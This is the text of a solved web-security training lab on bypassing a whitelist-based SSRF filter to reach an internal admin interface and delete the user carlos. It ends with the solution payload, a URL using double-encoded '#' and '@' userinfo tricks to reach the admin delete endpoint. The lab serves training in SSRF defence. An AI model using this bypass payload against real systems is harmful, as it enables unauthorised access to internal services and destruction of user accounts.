Lab: SSRF with whitelist-based input filter
EXPERT

LAB
Solved
This lab has a stock check feature which fetches data from an internal system.

To solve the lab, change the stock check URL to access the admin interface at http://localhost/admin and delete the user carlos.

The developer has deployed an anti-SSRF defense you will need to bypass.


// http://localhost:80%2523@stock.weliketoshop.net/admin/delete?username=carlos